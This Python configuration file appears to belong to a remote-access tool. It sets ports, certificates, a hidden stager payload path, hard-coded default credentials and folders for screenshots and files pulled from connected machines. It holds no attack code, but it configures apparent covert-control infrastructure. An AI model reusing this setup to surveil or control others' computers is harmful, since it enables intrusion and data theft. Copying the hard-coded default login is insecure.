# Date: 08/13/2018
# Author: Pure-L0G1C
# Description: Config file

import os

################
#    READ ME   #
################
#######################################################################################################
### This is only required if you are connecting to computers outside of your network ###
#
# If you are connecting to computers outside
# of your network, you must enable port forwarding
# on your router. You must have have the FTP_PORT, SSH_PORT
# and the port you started the server on open on your router. Both the FTP_PORT and SSH_PORT
# can be confirgured below.
#
# You must also set the PRIVATE_IP as the ip of your computer
# and set the PUBLIC_IP as your public ip.
#
#######################################################################################################

#################### Configuration Section ####################

# ip
PRIVATE_IP = "127.0.0.1"  # IP from your router to your pc
PUBLIC_IP = "127.0.0.1"  # IP from your ISP to your router

# ports
FTP_PORT = 128
SSH_PORT = 256

#################### DO NOT TOUCH ANYTHING BELOW ####################

VERSION = "v0.1.1"

# database
DATABASE = "database/database.db"

if not os.path.exists(os.path.dirname(DATABASE)):
    os.makedirs(os.path.dirname(DATABASE))

# account
LOCK_TIME = 300  # in seconds
MAX_FAILED_ATTEMPTS = 3  # attempts before locking

# cert
if not os.path.exists("cert"):
    os.makedirs("cert")

CERT_FILE = "cert/public.crt"
KEY_FILE = "cert/private.key"

# communication codes
STAGER_CODE = 0
CONN_CODE = 1

# stager
PAYLOAD_PATH = "agent/.bin/.payload.exe"
BLOCK_SIZE = 65535


# Settings
MIN_USERNAME_LENGTH = 4
MAX_USERNAME_LENGTH = 16

MIN_PASSWORD_LENGTH = 12
MAX_PASSWORD_LENGTH = 256

# Default creds
DEFAULT_USERNAME = "loki"
DEFAULT_PASSWORD = "ikol"

# Downloads path
DOWNLOADS_PATH = "downloads"
SCREENSHOTS_PATH = os.path.join(DOWNLOADS_PATH, "screenshots")
FILES_PATH = os.path.join(DOWNLOADS_PATH, "files")

if not os.path.exists(SCREENSHOTS_PATH):
    os.makedirs(SCREENSHOTS_PATH)

if not os.path.exists(FILES_PATH):
    os.makedirs(FILES_PATH)
